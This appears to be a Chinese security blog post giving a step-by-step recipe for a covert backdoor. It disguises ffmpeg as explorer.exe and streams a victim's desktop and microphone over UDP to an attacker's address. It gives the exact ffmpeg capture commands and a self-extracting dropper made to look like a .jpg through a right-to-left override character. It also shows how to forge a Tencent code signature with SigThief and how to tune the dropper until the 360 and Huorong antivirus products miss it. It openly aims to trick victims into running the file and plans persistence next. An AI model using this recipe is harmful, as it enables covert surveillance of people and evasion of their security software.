<!DOCTYPE html>
<html><head>
<title>2020免杀，ffmpeg实时监听桌面和麦克风</title>

<meta charset="utf-8">
<meta name="X-UA-Compatible" content="IE=edge">
<meta name="google-site-verification" content="">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
<meta content="telephone=no" name="format-detection">
<meta name="renderer" content="webkit">
<meta name="theme-color" content="#ffffff">




<script src="/vendor/js/jquery.min.js" ></script>
<script src="/vendor/js/popper.min.js" ></script>
<script src="/vendor/js/bootstrap.min.js" ></script>
<script src="/vendor/js/smooth-scroll.polyfills.min.js" ></script>
<link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">
<script src="/vendor/js/vue.min.js" ></script>




<link rel="stylesheet" href="https://killmonday.github.io/scss/journal.min.75e350a979186b10ecf739a405199a5eaf37fd6bd3463a78ae5c70c634963fde.css" integrity="sha256-deNQqXkYaxDs9zmkBRmaXq83/WvTRjp4rlxwxjSWP94=" media="screen">

<script src="https://killmonday.github.io/js/loadCSS.js"></script>
<script src="https://killmonday.github.io/js/table.js"></script>


<script src="https://killmonday.github.io/js/toc.js"></script>


<script>
    loadCSS("https://fonts.googleapis.com/css?family=Lora|Montserrat|Fira+Mono|Noto+Serif+SC|Material+Icons");
</script>






</head><body>
    	<div id="app"><div ref="sideContainer" class="side-container">
    
    <a class="a-block nav-head false" href="https://killmonday.github.io">
    
        <div class="nav-title">
            nowhere
        </div>
        
        <div class="nav-subtitle">
            a blog in the air.
        </div>
        
    </a>

    <div class="nav-link-list">
        
        
            
                
                
                <a class="a-block nav-link-item false" href="/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4">
                    安全运维
                </a>
        
            
                
                
                <a class="a-block nav-link-item false" href="/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8">
                    无线安全
                </a>
        
            
                
                
                <a class="a-block nav-link-item false" href="/%E5%90%8E%E9%97%A8">
                    后门
                </a>
        
    </div>

    

    <div class="nav-footer">
        
&copy;
	
	2020 ownhp. All rights reserved.
	
    </div>
    
</div><div ref="extraContainer" class="extra-container">
    
    <div class="toc animated-visibility" :class="{ invisible: scrollY <= 140 }">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
			
				
				
					
						
						
							<ul>
						
						
								<li>
				 					<a href="#1ffmpeg%e6%98%af%e4%bb%80%e4%b9%88" v-on:click="closeDrawer" id="1ffmpeg是什么-nav">
										 1.ffmpeg是什么
									</a>
								</li>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
						
								<li>
				 					<a href="#2%e5%ae%9e%e9%aa%8c%e5%86%85%e5%ae%b9" v-on:click="closeDrawer" id="2实验内容-nav">
										 2.实验内容
									</a>
								</li>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
						
								<li>
				 					<a href="#3%e5%ae%9e%e9%aa%8c%e8%bf%87%e7%a8%8b" v-on:click="closeDrawer" id="3实验过程-nav">
										 3.实验过程
									</a>
								</li>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#31-%e5%ae%89%e5%8d%93%e6%89%8b%e6%9c%ba%e5%ae%89%e8%a3%85ffmpeg" v-on:click="closeDrawer" id="31-安卓手机安装ffmpeg-nav">
										 3.1 安卓手机安装ffmpeg
									</a>
								</li>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#32-%e5%88%b6%e4%bd%9c%e5%90%8e%e9%97%a8" v-on:click="closeDrawer" id="32-制作后门-nav">
										 3.2 制作后门
									</a>
								</li>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#winrar%e8%87%aa%e8%a7%a3%e5%8e%8b%e7%a8%8b%e5%ba%8f%e5%88%b6%e4%bd%9c" v-on:click="closeDrawer" id="winrar自解压程序制作-nav">
										 WinRAR自解压程序制作
									</a>
								</li>
						
							</ul>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#%e5%85%8d%e6%9d%80" v-on:click="closeDrawer" id="免杀-nav">
										 免杀
									</a>
								</li>
						
							</ul>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#%e7%94%9f%e6%88%90%e8%87%aa%e8%a7%a3%e5%8e%8bexe" v-on:click="closeDrawer" id="生成自解压exe-nav">
										 生成自解压exe
									</a>
								</li>
						
							</ul>
						
							</ul>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#%e4%bd%bf%e7%94%a8sigthief%e7%ad%be%e5%90%8d" v-on:click="closeDrawer" id="使用sigthief签名-nav">
										 使用SigThief签名
									</a>
								</li>
						
							</ul>
						
							</ul>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#%e9%99%84%e5%85%8d%e6%9d%80%e7%9a%84%e7%bb%8f%e8%bf%87" v-on:click="closeDrawer" id="附免杀的经过-nav">
										 附：免杀的经过
									</a>
								</li>
						
							</ul>
						
							</ul>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#%e9%99%84ffmpeg%e5%91%bd%e4%bb%a4%e8%af%a6%e8%a7%a3" v-on:click="closeDrawer" id="附ffmpeg命令详解-nav">
										 附：Ffmpeg命令详解
									</a>
								</li>
						
							</ul>
						
							</ul>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#33-%e5%8f%97%e5%ae%b3%e8%80%85%e8%bf%90%e8%a1%8c%e5%90%8e%e9%97%a8" v-on:click="closeDrawer" id="33-受害者运行后门-nav">
										 3.3 受害者运行后门
									</a>
								</li>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#34-vlc%e6%92%ad%e6%94%be" v-on:click="closeDrawer" id="34-vlc播放-nav">
										 3.4 VLC播放
									</a>
								</li>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
						
								<li>
				 					<a href="#4%e5%b1%95%e6%9c%9b" v-on:click="closeDrawer" id="4展望-nav">
										 4.展望
									</a>
								</li>
						
							</ul>
						
					
				
			
	</div>

</div>
    
    <div class="pagination">
        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top" :class="{ invisible: scrollY == 0 }">
            <i class="material-icons pagination-action-icon">
                keyboard_arrow_up
            </i>
        </a>
        
    </div>
</div><div class="single-column-drawer-container" ref="drawer"
     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
    <div class="drawer-content">
        <div class="drawer-menu">
            
            
                
                    
                    
                    <a class="a-block drawer-menu-item false" href="/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4">
                        安全运维
                    </a>
            
                
                    
                    
                    <a class="a-block drawer-menu-item false" href="/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8">
                        无线安全
                    </a>
            
                
                    
                    
                    <a class="a-block drawer-menu-item false" href="/%E5%90%8E%E9%97%A8">
                        后门
                    </a>
            
            
            <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
			
				
				
					
						
						
							<ul>
						
						
								<li>
				 					<a href="#1ffmpeg%e6%98%af%e4%bb%80%e4%b9%88" v-on:click="closeDrawer" id="1ffmpeg是什么-nav">
										 1.ffmpeg是什么
									</a>
								</li>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
						
								<li>
				 					<a href="#2%e5%ae%9e%e9%aa%8c%e5%86%85%e5%ae%b9" v-on:click="closeDrawer" id="2实验内容-nav">
										 2.实验内容
									</a>
								</li>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
						
								<li>
				 					<a href="#3%e5%ae%9e%e9%aa%8c%e8%bf%87%e7%a8%8b" v-on:click="closeDrawer" id="3实验过程-nav">
										 3.实验过程
									</a>
								</li>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#31-%e5%ae%89%e5%8d%93%e6%89%8b%e6%9c%ba%e5%ae%89%e8%a3%85ffmpeg" v-on:click="closeDrawer" id="31-安卓手机安装ffmpeg-nav">
										 3.1 安卓手机安装ffmpeg
									</a>
								</li>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#32-%e5%88%b6%e4%bd%9c%e5%90%8e%e9%97%a8" v-on:click="closeDrawer" id="32-制作后门-nav">
										 3.2 制作后门
									</a>
								</li>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#winrar%e8%87%aa%e8%a7%a3%e5%8e%8b%e7%a8%8b%e5%ba%8f%e5%88%b6%e4%bd%9c" v-on:click="closeDrawer" id="winrar自解压程序制作-nav">
										 WinRAR自解压程序制作
									</a>
								</li>
						
							</ul>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#%e5%85%8d%e6%9d%80" v-on:click="closeDrawer" id="免杀-nav">
										 免杀
									</a>
								</li>
						
							</ul>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#%e7%94%9f%e6%88%90%e8%87%aa%e8%a7%a3%e5%8e%8bexe" v-on:click="closeDrawer" id="生成自解压exe-nav">
										 生成自解压exe
									</a>
								</li>
						
							</ul>
						
							</ul>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#%e4%bd%bf%e7%94%a8sigthief%e7%ad%be%e5%90%8d" v-on:click="closeDrawer" id="使用sigthief签名-nav">
										 使用SigThief签名
									</a>
								</li>
						
							</ul>
						
							</ul>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#%e9%99%84%e5%85%8d%e6%9d%80%e7%9a%84%e7%bb%8f%e8%bf%87" v-on:click="closeDrawer" id="附免杀的经过-nav">
										 附：免杀的经过
									</a>
								</li>
						
							</ul>
						
							</ul>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#%e9%99%84ffmpeg%e5%91%bd%e4%bb%a4%e8%af%a6%e8%a7%a3" v-on:click="closeDrawer" id="附ffmpeg命令详解-nav">
										 附：Ffmpeg命令详解
									</a>
								</li>
						
							</ul>
						
							</ul>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#33-%e5%8f%97%e5%ae%b3%e8%80%85%e8%bf%90%e8%a1%8c%e5%90%8e%e9%97%a8" v-on:click="closeDrawer" id="33-受害者运行后门-nav">
										 3.3 受害者运行后门
									</a>
								</li>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
							<ul>
						
						
								<li>
				 					<a href="#34-vlc%e6%92%ad%e6%94%be" v-on:click="closeDrawer" id="34-vlc播放-nav">
										 3.4 VLC播放
									</a>
								</li>
						
							</ul>
						
							</ul>
						
					
				
			
				
				
					
						
						
							<ul>
						
						
								<li>
				 					<a href="#4%e5%b1%95%e6%9c%9b" v-on:click="closeDrawer" id="4展望-nav">
										 4.展望
									</a>
								</li>
						
							</ul>
						
					
				
			
	</div>

</div>
            
        </div>
    </div>
</div>
<transition name="fade">
    <div v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
</transition>
<nav ref="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
    <div ref="navBackground" class="nav-background"></div>
    <div class="container container-narrow nav-content">
        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
            <i class="material-icons">
                menu
            </i>
        </button>
        <a ref="navTitle" class="navbar-brand" href="https://killmonday.github.io">
            nowhere
        </a>
    </div>
</nav>
<div class="single-column-header-container" ref="pageHead"
     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
    <a href="https://killmonday.github.io">
        <div class="single-column-header-title">nowhere</div>
        
        <div class="single-column-header-subtitle">a blog in the air.</div>
        

    </a>
</div>
            <div id="content">
<div ref="streamContainer" class="stream-container">
    <div class="post-list-container post-list-container-shadow">
        <div class="post">
            
            
            
                
            

            <div class="post-head-wrapper"
                 style="background-image: url('/imageOfPaperHead/ffmpeg%e5%90%8e%e9%97%a8.jpg')">
                <div class="post-title">
                    2020免杀，ffmpeg实时监听桌面和麦克风
                    <div class="post-meta">
                        <time itemprop="datePublished">
                            2020-02-26 20:45
                        </time>

                        

                        
                    </div>
                </div>
            </div>
            
            <div class="post-body-wrapper">
                <div class="post-body">
                    <h1 id="1ffmpeg是什么">1.ffmpeg是什么</h1>
<p>FFmpeg是一个多媒体框架，能够编码、传输和播放大多数格式的文件（可运行在Windows，macOS和基于Unix的发行版系统）。它是一款可移植的独立软件，可以作为单个可执行文件运行，而无需任何安装或配置。</p>
<p>利用ffmpeg，不需要远程桌面，不需要打开目标计算机的任何端口，就可以实时直播Windows10桌面和监听麦克风。</p>
<h1 id="2实验内容">2.实验内容</h1>
<ul>
<li>
<p>攻击者</p>
<ul>
<li>在安卓手机上
<ul>
<li>使用内网穿透软件得到可公网代理</li>
<li>安装ffmpeg</li>
<li>使用ffmpeg监听端口，以便接收受害者机器传来的视频流并保存到本地</li>
<li>在谷歌商店安装VLC：一款可以播放实时传输视频的APP</li>
</ul>
</li>
<li>在PC上
<ul>
<li>对ffmpeg.exe做免杀和伪装处理，以一切手段诱使目标计算机执行</li>
</ul>
</li>
</ul>
</li>
<li>
<p>在受害者机器上</p>
<ul>
<li>执行伪装后的ffmpeg.exe，使用ffmpeg发送视频流（以UDP传输）到远程端口。</li>
</ul>
</li>
</ul>
<p>注：攻击者也可以直接使用在公网的个人服务器来接收视频流，例如VPS主机、阿里云服务器。</p>
<h1 id="3实验过程">3.实验过程</h1>
<p>以下是操作步骤。</p>
<h2 id="31-安卓手机安装ffmpeg">3.1 安卓手机安装ffmpeg</h2>
<p>攻击者在手机上的谷歌商店安装userland后，点击安装kali系统（精简版，几分钟就可以）。</p>
<p>设置好root口令后，用userland自带的ssh登录工具登录到模拟的kali系统。</p>
<ul>
<li>在kali系统里安装ffmpeg：</li>
</ul>
<pre><code>apt-get install ffmpeg
</code></pre><ul>
<li>启动ffmpeg</li>
</ul>
<pre><code>ffmpeg -i udp://0.0.0.0:10001 /storage/internal/livestream.avi
</code></pre><p>注：路径选为自己的安卓手机安装userland后得到的共享目录，一般在kali里就是“/storage/internal”。</p>
<p>至于如何在安卓文件系统里找到该共享目录，可以先在kali的该目录下创建一个文件，然后在安卓文件系统里查找该文件名，以此找到共享文件夹的位置。</p>
<ul>
<li>在谷歌商店安装VLC</li>
</ul>
<p>略</p>
<h2 id="32-制作后门">3.2 制作后门</h2>
<h3 id="winrar自解压程序制作">WinRAR自解压程序制作</h3>
<ul>
<li>
<p>把ffmpeg.exe改名为explorer.exe，增强其在任务管理器中的迷惑性。</p>
<p>如果需要更强的伪装，可以下载windows10系统的程序图标库，并给explorer.exe打上ico。</p>
</li>
</ul>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image1.png" alt=""></p>
<ul>
<li>编写.bat批处理文件，并用&quot;bat to exe converter&quot;打开，生成exe文件，这里我给生成的exe文件命名为&quot;server.exe&rdquo;。</li>
</ul>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image2.png" alt=""></p>
<p>批处理内容：</p>
<pre><code>.\explorer.exe -f gdigrab -i desktop -f dshow -f avi udp://192.168.31.165:10001
</code></pre><p>注意，命令中当前目录下的explorer.exe其实是ffmpeg.exe重命名后的文件。</p>
<p><strong>一定要勾选upx压缩</strong>，实测不加壳的话点击运行则360直接报木马，但加壳就不报了。</p>
<p>至于explorer.exe（也就是ffmpeg.exe，本身是合法的可执行程序，在各大杀软白名单中）。</p>
<ul>
<li>用winrar打包，生成自解压可执行程序，并加上诱惑的图标</li>
</ul>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image3.png" alt=""></p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image4.png" alt=""></p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image5.png" alt=""></p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image6.png" alt=""></p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image7.png" alt=""></p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image8.png" alt=""></p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image9.png" alt="">、</p>
<ul>
<li>伪装文件名为jpg</li>
</ul>
<p>利用unicode控制字符，在不改变文件属性（可执行文件）的情况下，使文件名显示出如下形式：&lt;xxx&gt;.jpg。</p>
<p>打开目录，可以看到上一步我们生成的自解压文件，带着图标，很像一个图片文件了。</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image10.png" alt=""></p>
<p>现在重命名，先命名为&quot;cateegpj.exe&rdquo;：</p>
<p>//注意，gpj就是jpg的回文</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image11.png" alt=""></p>
<p>然后点击鼠标使光标移动到g的左边：</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image12.png" alt=""></p>
<p>在此处右键，选择插入unicode控制字符的RLO字符：</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image13.png" alt=""></p>
<p>刷新一下，可以看到，文件名变成.jpg：</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image14.png" alt=""></p>
<p>（太像了，滑稽）</p>
<p>现在测试一下能不能过杀软的静态查杀和主动防御。</p>
<p>我的计算机安装了360安全卫士和火绒（5.0规则+自定义），全部选择最严格的主动防御模式，严密监控文件读写执行：</p>
<p>（1）360静态扫描直接报毒，动态直接拦截为木马</p>
<p>（2）火绒静态不报毒（应该跟它不上传云有关），动态弹出用户控制窗口（我的自定义规则比较严，只要调用cmd或powershell的程序全都会弹）。</p>
<h3 id="免杀">免杀</h3>
<p>经过不断的控制变量测试，终于找到了免杀方法。先说结论：</p>
<p>生成自解压exe后，用SigThief为其伪造一份腾讯签名，即可免杀。怎么做：</p>
<h4 id="生成自解压exe">生成自解压exe</h4>
<p>过程基本同上，略。</p>
<p>但有一处需改动，即<strong>更改自解压的目录为&rdquo;%USERPROFILE%\Music\&quot;</strong>，也就是我的文档下的&quot;音乐&quot;文件夹。</p>
<p>这是为了绕开火绒5.0默认规则中的&quot;temp文件夹下执行exe文件&rdquo;，</p>
<p>只要不在temp目录下，火绒就不弹用户控制窗口（@_@）</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image15.png" alt=""></p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image16.png" alt=""></p>
<p>生成文件：</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image17.png" alt=""></p>
<p>拷贝到SigThief目录下：</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image18.png" alt=""></p>
<h4 id="使用sigthief签名">使用SigThief签名</h4>
<p>①在SigThief目录打开powershell</p>
<p>②键入命令：</p>
<pre><code>C:/Python27/python.exe .\\sigthief.py -i .\\QQ.exe -t Desktop.exe -o signed\_desktop.exe
</code></pre><p>命令格式：</p>
<pre><code>C:/Python27/python.exe   .\\sigthief.py   -i   \&lt;被窃取签名的程序\&gt;   -t  &lt;待签名程序\&gt; -o \&lt;输出文件\&gt;
</code></pre><p>（此处我的python使用绝对路径是因为我装了多版本python）</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image19.png" alt=""></p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image20.png" alt=""></p>
<p>360云扫一下：</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image21.png" alt=""></p>
<p>火绒：</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image22.png" alt=""></p>
<p>双击执行：</p>
<p>360无法反应，火绒根据我添加的自定义规则弹出了用户控制窗口：</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image23.png" alt=""></p>
<p>可以看到&quot;防护项目&quot;是我自己添加的严苛规则，规则名叫&quot;运行cmd,powershell等&rdquo;。</p>
<p>我规定任何程序运行cmd或powershell，wscript等都需要用户确认，但大多数用户应该不像我这样不怕麻烦（滑稽）。</p>
<p>点击&quot;允许&quot;看看：</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image24.png" alt=""></p>
<p>可以看到，火绒又弹出了&quot;联网控制&quot;窗口（哈哈），这就莫得办法了，火绒还是挺棒哒，只能依赖用户的安全意识不强了。</p>
<p>但可以再猥琐一点，退回前面的步骤，在生成explorer.exe后再用sighthief签个名，于是就变成这样：</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image25.png" alt=""></p>
<p>迷惑性更强了点。</p>
<p>点击&quot;允许&quot;后，杀软再也没有有动静了。</p>
<p>可以看到任务管理器里有个进程explorer占用了约30%的cpu资源（这个可以再调低，在画质和cpu之间做个平衡，或者可以在ffmpeg中选择GPU编码？）：</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image26.png" alt=""></p>
<h4 id="附免杀的经过">附：免杀的经过</h4>
<p>经过n次测试：</p>
<p>①RLO文件名修改法已经被360无脑报毒，任何文件只要文件名包含RLO字符，一律视为木马病毒。</p>
<p>②生成自解压exe程序一般不报毒，但生成带自定义图标的自解压exe程序，360必定（应该就是）无脑报毒。</p>
<p>③用upx加壳，无效</p>
<p>④用SE免费版加壳，可以免杀几分钟并执行。几分钟后，360会弹窗告诉你刚才上传的文件被分析为木马病毒，应该也是太容易脱壳了。或者，所有加壳程序只要没有正规数字签名以及脱不了壳一律报毒。</p>
<h4 id="附ffmpeg命令详解">附：Ffmpeg命令详解</h4>
<h5 id="仅直播视频流">仅直播视频流</h5>
<pre><code>.\\ffmpeg.exe -f gdigrab -i desktop -f dshow -f avi udp://192.168.0.208:10001
</code></pre><p><a href="https://en.wikipedia.org/wiki/Graphics_Device_Interface">图形设备接口</a>（<strong>-fgdigrab</strong>）和<a href="https://docs.microsoft.com/en-us/windows/desktop/directshow/directshow">DirectShow的</a>（<strong>-fDSHOW</strong>）视窗组件负责代表图形和它们发送到连接的显示器和打印机。</p>
<p>FFmpeg本质上是利用这些组件（<strong>-idesktop</strong>）并将输出（<strong>udp：//</strong>）以AVI（<strong>-favi</strong>）格式发送到攻击者的服务器。</p>
<p>有关GDI和DirectShow的更多信息以及可用的命令参数，请查看FFmpeg的文档&rdquo; <a href="https://ffmpeg.org/ffmpeg-devices.html#gdigrab">gdigrab</a> &ldquo;，&rdquo; <a href="https://trac.ffmpeg.org/wiki/Capture/Desktop">Desktop</a> &ldquo;和&rdquo; <a href="https://ffmpeg.org/ffmpeg-devices.html#dshow">dshow&rdquo;</a>。</p>
<h5 id="仅音频流">仅音频流</h5>
<p>首先，列出Windows 10计算机内置的可用输入接口。</p>
<pre><code>.\\ffmpeg.exe -list\_devices true -f dshow -i dummy
</code></pre><p>可能得到输出：</p>
<pre><code>ffmpeg version N-92981-g51978aefe8 Copyright (c) 2000-2019 the FFmpeg
developers

built with gcc 8.2.1 (GCC) 20181201

\[dshow @ 0000021d3560a480\] DirectShow audio devices

\[dshow @ 0000021d3560a480\] \&quot;Microphone (Realtek High Definition
Audio)\&quot;

\[dshow @ 0000021d3560a480\] Alternative name
\&quot;\@device\_cm\_{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\\wave\_{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\&quot;
</code></pre><p>根据目标Windows10计算机使用的硬件和麦克风的类型，它的显示可能会有所不同。</p>
<p>复制并输入与以下命令中出现的完全相同的音频接口名称，并带双引号：</p>
<pre><code>.\\ffmpeg.exe -f dshow -i audio=\&quot;Microphone (Realtek High Definition Audio)\&quot; -f avi udp://192.168.0.208:10001
</code></pre><p>该**-i**参数指示FFmpeg使用的**音频**输入。</p>
<h5 id="同时传视频流音频流">同时传视频流、音频流</h5>
<pre><code>.\\ffmpeg.exe -f dshow -i audio=\&quot;Microphone (Realtek High Definition Audio)\&quot;:video=\&quot;desktop\&quot; -f avi udp://192.168.0.208:10001
</code></pre><p>与<strong>audio= <strong>参数类似，此处，当流传输到攻击者的服务器时，将同时使用</strong>video=</strong> 和<strong>audio =</strong>输入。所述输入设备由冒号分隔（<strong>：</strong>），必须始终使用双引号。</p>
<h2 id="33-受害者运行后门">3.3 受害者运行后门</h2>
<p>用一切方法使受害者机器得到后门程序并运行。</p>
<h2 id="34-vlc播放">3.4 VLC播放</h2>
<p>安卓手机打开VLC，进入手机与userland的共享目录（每个手机不同），点击播放avi文件，即可实时看到受害者的屏幕。</p>
<p><img src="/media/ffmpeg%E5%90%8E%E9%97%A8/image27.jpeg" alt=""></p>
<p>注：还有一种思路：</p>
<ul>
<li>在手机的userland的kali中安装ngrok</li>
<li>使用ngrok的免费代理服务打开某个端口监听</li>
<li>ffmpeg换个传输协议，并在命令中协商ngrok的代理服务器地址，这样就实现了手机的内网穿透，使得攻击者手机不需要再和受害者机器处于同一子网。</li>
</ul>
<h1 id="4展望">4.展望</h1>
<p>给该后门添加可持续（persistence）功能，手段例如命令行写注册表或添加.bat脚本到启动文件夹。</p>

                    <HR width="100%" id="EOF">
                    <p style="color:#777;">Last modified on 2020-02-26</p>
                </div>
                
            </div>
            
            
            <nav class="post-pagination">

                
                <a class="newer-posts">
                    Next<br>No newer posts.
                </a>
                
                
                
                <a class="older-posts" href="https://killmonday.github.io/posts/2.%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/1.%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC/%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC-start-fishing/">
                    Previous<br>2020无线钓鱼(3)——Start fishing
                </a>
                
            </nav>
            <div class="post-comment-wrapper">
                
                <p style="opacity: 0.6" align="center">
                    <small>Comments Disabled.</small>
                </p>
                
            </div>
        </div>
    </div>
</div>

            </div><div id="single-column-footer">
&copy;
	
	2020 ownhp. All rights reserved.
	</div>
    	</div>
    <script src="https://killmonday.github.io/js/journal.js"></script>
    </body>
</html>
